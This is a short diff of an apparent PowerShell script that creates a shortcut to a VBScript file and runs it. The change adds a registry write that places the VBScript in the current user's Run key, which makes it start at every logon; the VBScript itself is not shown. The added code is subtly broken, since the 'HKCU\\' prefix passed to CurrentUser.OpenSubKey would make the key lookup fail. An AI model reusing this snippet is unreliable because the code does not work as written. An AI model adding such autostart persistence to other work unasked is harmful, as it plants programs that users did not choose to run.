@@ -73,6 +73,11 @@ $shortcut = $WshShell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = $vbsFilePath
 $shortcut.Save()
 
+# Create the registry key
+$keyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($keyPath, $true)
+$regKey.SetValue("MyScript", $vbsFilePath)
+
 # Run the VBScript file
 $WshShell = New-Object -ComObject WScript.Shell
 $WshShell.Run($vbsFilePath)
